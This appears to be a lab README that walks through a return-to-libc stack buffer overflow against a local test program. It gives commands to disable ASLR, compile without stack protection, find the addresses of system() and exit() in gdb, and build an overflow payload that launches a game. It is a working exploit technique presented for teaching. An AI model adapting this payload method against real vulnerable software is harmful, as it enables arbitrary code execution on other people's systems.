##########################
# Return-to-libc Attack  #
##########################


1-Initial steps
#################################

Disable the Address Space Layout Randomization (ASLR):
    sudo sysctl kernel.randomize_va_space=0

Compile the program:
    gcc -o return_to_libc_attack return_to_libc_attack.c -fno-stack-protector -z execstack -g -fPIE


2-Attack
#################################

First of all, create an environment variable with the comand shell that we want to execute.
    export ATTACK='/usr/games/mahjongg'

Looking for the return address and the addresses of system() and exit() functions:
    1) gdb -q return_to_libc_attack
    2) r `python -c 'print "A"*28 + "B"*4'`
    4) i r
    3) p system
    4) p exit
    5) x/500s $esp --> find ATTACK= enviroment variable and sum 7 
                       which are the number of characters to get 
                       at the begining of the address.

    addr[system] = 0xb7e5e460
    addr[exit] = 0xb7e51fe0
    addr[ATTACK] = 0xbffffe28+7 = 0xbffffe2E

Buffer state:

High addresses                      /usr/games/mahjongg
                       ARGS         exit()
                       RET          system()
                       EBP          AAAA
                        -           AAAA...
                    buffer[16]      AAAA
                    buffer[16]      AAAA
                    buffer[16]      AAAA
                    buffer[16]      AAAA

Low address

Now it's time to execute the attack. The addresses are introduced backwards because of indianness (little endian):
    r `python -c 'print "A"*28 + "\x60\xe4\xe5\xb7" + "\xe0\x1f\xe5\xb7" + "\x2e\xfe\xff\xbf"'`
